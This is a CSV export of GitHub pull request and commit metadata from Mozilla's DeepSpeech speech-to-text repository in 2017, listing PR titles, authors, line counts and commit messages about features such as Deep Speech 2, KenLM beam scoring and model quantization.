3597,https://api.github.com/repos/mozilla/DeepSpeech/pulls/816,816,Issue760,,liuguangyuan,7778127,2017-09-06T06:10:25Z,NONE,False,23,18,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6f8d36d818612198f139f5284de12d042fbf9525,Fixed #760
3598,https://api.github.com/repos/mozilla/DeepSpeech/pulls/815,815,Ds2 v2,,liuguangyuan,7778127,2017-09-06T06:08:38Z,NONE,False,259,146,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,72a6331e808efbdf93715f4ac5ea9226ad202818,Add Deep Speech 2 implementation
3599,https://api.github.com/repos/mozilla/DeepSpeech/pulls/815,815,Ds2 v2,,liuguangyuan,7778127,2017-09-06T06:08:38Z,NONE,False,259,146,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f263dd1134d8e76cf9d24cb83f90129bff8bfde4,minor name error fixes
3600,https://api.github.com/repos/mozilla/DeepSpeech/pulls/815,815,Ds2 v2,,liuguangyuan,7778127,2017-09-06T06:08:38Z,NONE,False,259,146,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9b61505424e2c900cfd8a40c448909e030b05aca,Feed is_training placeholder when retrieving global_step from checkpoint
3601,https://api.github.com/repos/mozilla/DeepSpeech/pulls/815,815,Ds2 v2,,liuguangyuan,7778127,2017-09-06T06:08:38Z,NONE,False,259,146,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,02f33810b74c4f308c4344967eeca0fa9c0fa4f9,Add a bin/run-ds2.sh script
3602,https://api.github.com/repos/mozilla/DeepSpeech/pulls/815,815,Ds2 v2,,liuguangyuan,7778127,2017-09-06T06:08:38Z,NONE,False,259,146,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6b6e51fe37174d33a192c34491d9b468c6b7a304,Respect decay command line flag
3603,https://api.github.com/repos/mozilla/DeepSpeech/pulls/815,815,Ds2 v2,,liuguangyuan,7778127,2017-09-06T06:08:38Z,NONE,False,259,146,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,02b64c1a2a9a04ef09cb5033601cbc91e536e867,Fix export code for DS2
3604,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9ec213b69c62f6f398bb8cad11df9f1a5e0a2a96,"Merge pull request #95 from lissyx/wer-update

Wer update"
3605,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,15d621b9c7a634612bcd21ed4c3096f633f82bf1,"Merge pull request #98 from lissyx/wer-update

Wer update"
3606,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,092e5cd6a2aeb6f468dcf23efeed8986601c1ff3,"Merge pull request #103 from lissyx/wer-update

Wer update"
3607,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a851136acf23c4a9fe294ba5232c6da8924770ff,Merge remote-tracking branch 'upstream/master' into wer-update
3608,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,89ee4f6557cd4f621e9ee517cc3719c9046143a0,"Merge pull request #119 from lissyx/wer-update

Wer update"
3609,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,083474f90a234d58bee31e2814a23b9877a8f779,Merge remote-tracking branch 'upstream/master' into wer-update
3610,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e9c9103a1ef11734273cf59317f6f7986615fa63,"Merge pull request #123 from lissyx/wer-update

Wer update"
3611,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7dc951d6b2f75f06ceb68dd8057e417e409e737b,Merge remote-tracking branch 'upstream/master' into wer-update
3612,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5fad4e30037c298e92dcb5a1cbc31f6a79070fdc,"Merge pull request #137 from lissyx/wer-update

Wer update"
3613,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,25dbf39622d38928ffa75c8fc71b1edb123f410d,Merge remote-tracking branch 'upstream/master' into wer-update
3614,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b56e26c51d9a2c1dca5cacac924400ac7d05a27b,"Merge pull request #140 from lissyx/wer-update

Wer update"
3615,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c0e99ab53ff70198fbe6276ccbd4e9955c9aa58,Merge remote-tracking branch 'upstream/master' into wer-update
3616,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,41f6498781db6e8a9ddb5f9f30da1933ae017f54,"Merge pull request #152 from lissyx/wer-update

Wer update"
3617,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ea391ee657e8f7c79c7510df881185db8ad6766e,Merge remote-tracking branch 'upstream/master' into wer-update
3618,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0c7758dbb9a3747a39dac50147b237fd766ac7b7,"Merge pull request #155 from lissyx/wer-update

Wer update"
3619,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,facc42bec0bee7d9a2de3b1377ffcf4f8d05cb5a,Merge remote-tracking branch 'upstream/master' into wer-update
3620,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6e29e72d090e9a13865b6cf9119d1abad4b9a15b,"Merge pull request #162 from lissyx/wer-update

Wer update"
3621,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f13e44a0dfc3fd747ba0a8413b8b1ab5613343d1,Merge remote-tracking branch 'upstream/master' into wer-update
3622,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c6c7dd333586e856fe4b8a0149dac09fbeebafc0,"Merge pull request #170 from lissyx/wer-update

Wer update"
3623,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f582d76f83d90cefa2d8866134898f5ff8c01333,Merge remote-tracking branch 'upstream/master' into wer-update
3624,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,11c3cc652af1623ee7fbe8abc6db55ac61fde7cb,"Merge pull request #180 from lissyx/wer-update

Wer update"
3625,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bd6f7b46497571ec0f311d579c60bab678267751,Merge remote-tracking branch 'upstream/master' into wer-update
3626,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9cdada29594514339a12302b7f55e0c76f00714f,"Merge pull request #191 from lissyx/wer-update

Wer update"
3627,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc1cc94b3019d0926b0b6f2673a5ec8abab86d44,Merge remote-tracking branch 'upstream/master' into wer-update
3628,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,59182ed32ae9fac4ea82708c6f0b8c78c2f841d9,"Merge pull request #206 from lissyx/wer-update

Wer update"
3629,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ffa079525ddf4c842737f18b96d6feb7b5448d7,Merge remote-tracking branch 'upstream/master' into wer-update
3630,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,573079c47a10d4ceccf0d4242e06b61cb5f93ffd,"Merge pull request #214 from lissyx/wer-update

Wer update"
3631,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0662ceb038fcda45fdb363d9fa5a201b7e8c07e6,Merge remote-tracking branch 'upstream/master' into wer-update
3632,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,85bf45fe1eb7446d2ef45fa834d04884892066b5,"Merge pull request #223 from lissyx/wer-update

Wer update"
3633,https://api.github.com/repos/mozilla/DeepSpeech/pulls/814,814,Wer tracking,,liuguangyuan,7778127,2017-09-06T06:07:17Z,NONE,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2b90844f95af659b1ba7620ca80d7977913f463c,Merge remote-tracking branch 'upstream/master' into wer-update
3634,https://api.github.com/repos/mozilla/DeepSpeech/pulls/813,813,WIP,,liuguangyuan,7778127,2017-09-06T06:03:04Z,NONE,False,218,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,607c3d29c02d249cad11f4a906fdb6c8b4fb2eb5,WIP
3635,https://api.github.com/repos/mozilla/DeepSpeech/pulls/812,812,Deep Compression implementation for storage optimization,,liuguangyuan,7778127,2017-09-06T06:01:30Z,NONE,False,807,1,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,818f6acb60e23f7dbfff0300eda8f596cb1b6b82,Deep Compression implementation for storage optimization
3636,https://api.github.com/repos/mozilla/DeepSpeech/pulls/810,810,Local/Remote benchmarking tool,Fixes #684,lissyx,1645737,2017-09-01T19:11:17Z,COLLABORATOR,True,888,3,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ccecc62c25233e7582be0ba52924544151aadb02,"Local/Remote benchmarking tool

Fixes #684"
3637,https://api.github.com/repos/mozilla/DeepSpeech/pulls/809,809,Check benchmark argument against proper argv,Fixes #808,lissyx,1645737,2017-09-01T17:15:50Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b2019e87586a06aa236cf26ef08da25905b0c33b,"Check benchmark argument against proper argv

Fixes #808"
3638,https://api.github.com/repos/mozilla/DeepSpeech/pulls/806,806,Make sure custom alphabet code works properly on Python 2,"Sorry, I didn't test the code on Python 2 :(",reuben,477142,2017-09-01T08:33:31Z,MEMBER,True,18,13,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b3d51f66406d604bf63188363df82fad9f8ac0ca,Make sure custom alphabet code works properly on Python 2
3639,https://api.github.com/repos/mozilla/DeepSpeech/pulls/805,805,Score CTC prefix beams with KenLM,Opening a PR to test the TaskCluster setup.,reuben,477142,2017-08-31T14:26:55Z,MEMBER,True,43814,77,326,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,af71da0d4d6c1862c18c2b4a4f5428149ed24916,Import KenLM
3640,https://api.github.com/repos/mozilla/DeepSpeech/pulls/805,805,Score CTC prefix beams with KenLM,Opening a PR to test the TaskCluster setup.,reuben,477142,2017-08-31T14:26:55Z,MEMBER,True,43814,77,326,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fc91e3d7b8a61b7b18e0abee4b21289396a0b723,Write a CTC beam search decoder TF op that scores beams with our LM
3641,https://api.github.com/repos/mozilla/DeepSpeech/pulls/805,805,Score CTC prefix beams with KenLM,Opening a PR to test the TaskCluster setup.,reuben,477142,2017-08-31T14:26:55Z,MEMBER,True,43814,77,326,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2cccd334527380b3da3f4d39aac06c7879ee089f,Remove current re-scoring of decoder output and switch to custom op
3642,https://api.github.com/repos/mozilla/DeepSpeech/pulls/805,805,Score CTC prefix beams with KenLM,Opening a PR to test the TaskCluster setup.,reuben,477142,2017-08-31T14:26:55Z,MEMBER,True,43814,77,326,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,86b0ed612cb597eae9bbe91d4b24f02eb2ffd284,Make sure automation works with the new decoder
3643,https://api.github.com/repos/mozilla/DeepSpeech/pulls/805,805,Score CTC prefix beams with KenLM,Opening a PR to test the TaskCluster setup.,reuben,477142,2017-08-31T14:26:55Z,MEMBER,True,43814,77,326,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1f3d26ddda6881e8e59c17b4eb5c8bb39471256b,Address review comments
3644,https://api.github.com/repos/mozilla/DeepSpeech/pulls/805,805,Score CTC prefix beams with KenLM,Opening a PR to test the TaskCluster setup.,reuben,477142,2017-08-31T14:26:55Z,MEMBER,True,43814,77,326,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b42c83c859e9bed541e0f28cb8ff6c582b20b90c,Package LICENSE and README.mozilla with native_client.tar.xz
3645,https://api.github.com/repos/mozilla/DeepSpeech/pulls/805,805,Score CTC prefix beams with KenLM,Opening a PR to test the TaskCluster setup.,reuben,477142,2017-08-31T14:26:55Z,MEMBER,True,43814,77,326,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7d06bd9b3c849cc1837910ca37846eaaab031b27,Import Boost.Locale files needed for utf_to_utf conversion
3646,https://api.github.com/repos/mozilla/DeepSpeech/pulls/805,805,Score CTC prefix beams with KenLM,Opening a PR to test the TaskCluster setup.,reuben,477142,2017-08-31T14:26:55Z,MEMBER,True,43814,77,326,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,194de744b7c7e5f0e2c74084698f485aa1214fa7,Switch from <codecvt> to Boost.Locale for charset transformation
3647,https://api.github.com/repos/mozilla/DeepSpeech/pulls/805,805,Score CTC prefix beams with KenLM,Opening a PR to test the TaskCluster setup.,reuben,477142,2017-08-31T14:26:55Z,MEMBER,True,43814,77,326,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d6a2f58ff8f66f8cf044675c85c0a4c068c45203,Cleanup deepspeech_utils library definition
3648,https://api.github.com/repos/mozilla/DeepSpeech/pulls/805,805,Score CTC prefix beams with KenLM,Opening a PR to test the TaskCluster setup.,reuben,477142,2017-08-31T14:26:55Z,MEMBER,True,43814,77,326,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1bfb0286fe5ef410cd0766b074f34088f8df23e4,Address final review comments
3649,https://api.github.com/repos/mozilla/DeepSpeech/pulls/805,805,Score CTC prefix beams with KenLM,Opening a PR to test the TaskCluster setup.,reuben,477142,2017-08-31T14:26:55Z,MEMBER,True,43814,77,326,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4ccab71b54bfeb2c05240ed09d06a4e6af97ba90,Expose util/tc.py functionality as externally runnable and document it
3650,https://api.github.com/repos/mozilla/DeepSpeech/pulls/804,804,Provide TaskCluster badge in README,Fixes #803,lissyx,1645737,2017-08-31T11:56:42Z,COLLABORATOR,True,4,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,79211d892bac59342a50a4043ce1aab0d8b6fde0,"Provide TaskCluster badge in README

Fixes #803"
3651,https://api.github.com/repos/mozilla/DeepSpeech/pulls/802,802,Quantize tf1.0.0 distributed tf,Reopening.,lissyx,1645737,2017-08-31T11:44:20Z,COLLABORATOR,False,1009,157,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b37b984fd7ee3a754bda205c253f0e7aeb7c56ab,"WIP: Quantization of model

Fixes #133"
3652,https://api.github.com/repos/mozilla/DeepSpeech/pulls/802,802,Quantize tf1.0.0 distributed tf,Reopening.,lissyx,1645737,2017-08-31T11:44:20Z,COLLABORATOR,False,1009,157,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce7453bc227a871d6291f83d52ff7fdc7be83549,Add quantization-dedicated test script
3653,https://api.github.com/repos/mozilla/DeepSpeech/pulls/802,802,Quantize tf1.0.0 distributed tf,Reopening.,lissyx,1645737,2017-08-31T11:44:20Z,COLLABORATOR,False,1009,157,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c99e0cab802592518c3a97ca8b7a472605bfde56,Supporting easy switching between BasicLSTM and BasicRNN
3654,https://api.github.com/repos/mozilla/DeepSpeech/pulls/802,802,Quantize tf1.0.0 distributed tf,Reopening.,lissyx,1645737,2017-08-31T11:44:20Z,COLLABORATOR,False,1009,157,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ebf2ab9270d548c3d936dc6460a6c7862b20351,Computing inference time
3655,https://api.github.com/repos/mozilla/DeepSpeech/pulls/802,802,Quantize tf1.0.0 distributed tf,Reopening.,lissyx,1645737,2017-08-31T11:44:20Z,COLLABORATOR,False,1009,157,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,783920d3fe28c3e7113ce410a32741a47b16494f,WIP: Hacking on RNN/LSTM
3656,https://api.github.com/repos/mozilla/DeepSpeech/pulls/802,802,Quantize tf1.0.0 distributed tf,Reopening.,lissyx,1645737,2017-08-31T11:44:20Z,COLLABORATOR,False,1009,157,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6852a2bf8d8301dd364222133f1e24d2865a4325,WIP: Tooling for slow 8-bits investigation
3657,https://api.github.com/repos/mozilla/DeepSpeech/pulls/802,802,Quantize tf1.0.0 distributed tf,Reopening.,lissyx,1645737,2017-08-31T11:44:20Z,COLLABORATOR,False,1009,157,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,32c1513d73153521e347e603f5c2d91dbd175bcb,WIP: Set maxRunTime to 2h
3658,https://api.github.com/repos/mozilla/DeepSpeech/pulls/802,802,Quantize tf1.0.0 distributed tf,Reopening.,lissyx,1645737,2017-08-31T11:44:20Z,COLLABORATOR,False,1009,157,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,432ba8a0cfc02c6896aa3a246a0d5b5da4292a24,WIP: Hacking with AOT/tfcompile
3659,https://api.github.com/repos/mozilla/DeepSpeech/pulls/800,800,Upgrade VoxForge importer to BeautifulSoup 4 and fix Python 2/3 compat,Hey @gardenia22 can you review these changes? I've tested on Python 2 and 3.,reuben,477142,2017-08-31T08:25:46Z,MEMBER,True,14,11,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5d2935e2defaf02687c36d4b8aa9132d5d33f9aa,Upgrade to BeautifulSoup 4
3660,https://api.github.com/repos/mozilla/DeepSpeech/pulls/800,800,Upgrade VoxForge importer to BeautifulSoup 4 and fix Python 2/3 compat,Hey @gardenia22 can you review these changes? I've tested on Python 2 and 3.,reuben,477142,2017-08-31T08:25:46Z,MEMBER,True,14,11,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e7e8186e07123804162fb20994b348886a0f2521,Python 2/3 compat fixes
3661,https://api.github.com/repos/mozilla/DeepSpeech/pulls/797,797,Support custom alphabet mappings (Fixes #692),,reuben,477142,2017-08-29T19:25:19Z,MEMBER,True,196,60,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,085379bcb7c6c1e0840c56ff516df414ef330a21,Support custom alphabet mappings
3662,https://api.github.com/repos/mozilla/DeepSpeech/pulls/797,797,Support custom alphabet mappings (Fixes #692),,reuben,477142,2017-08-29T19:25:19Z,MEMBER,True,196,60,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6b4218ea8126841bc46dddcbda7208a88e0a84f3,Address review comments
3663,https://api.github.com/repos/mozilla/DeepSpeech/pulls/797,797,Support custom alphabet mappings (Fixes #692),,reuben,477142,2017-08-29T19:25:19Z,MEMBER,True,196,60,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e1eab449bbe226f8604a66d2cc3c766b85be4b19,Add support for comments in alphabet.txt
3664,https://api.github.com/repos/mozilla/DeepSpeech/pulls/797,797,Support custom alphabet mappings (Fixes #692),,reuben,477142,2017-08-29T19:25:19Z,MEMBER,True,196,60,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3af806e8c5caa67898cbc0d83e6b061561f39349,Address more review comments
3665,https://api.github.com/repos/mozilla/DeepSpeech/pulls/797,797,Support custom alphabet mappings (Fixes #692),,reuben,477142,2017-08-29T19:25:19Z,MEMBER,True,196,60,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d35e7331502322292377dd6333710064b1b1d4d4,Address even more review comments
3666,https://api.github.com/repos/mozilla/DeepSpeech/pulls/790,790,Fixed #789,,kdavis-mozilla,12054740,2017-08-25T08:08:19Z,CONTRIBUTOR,True,6,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,80f0094f3b2b1d70dad236206b77d98b787e165c,Fixed #789
3667,https://api.github.com/repos/mozilla/DeepSpeech/pulls/788,788,Fixed #787,,kdavis-mozilla,12054740,2017-08-25T05:16:50Z,CONTRIBUTOR,True,14,11,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4cc439e4e75262cc5167da865a89fb2458a3297a,Fixed #787
3668,https://api.github.com/repos/mozilla/DeepSpeech/pulls/788,788,Fixed #787,,kdavis-mozilla,12054740,2017-08-25T05:16:50Z,CONTRIBUTOR,True,14,11,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f3447fcfaf569b23207579b265070994fda19ed5,Removed log level parameter
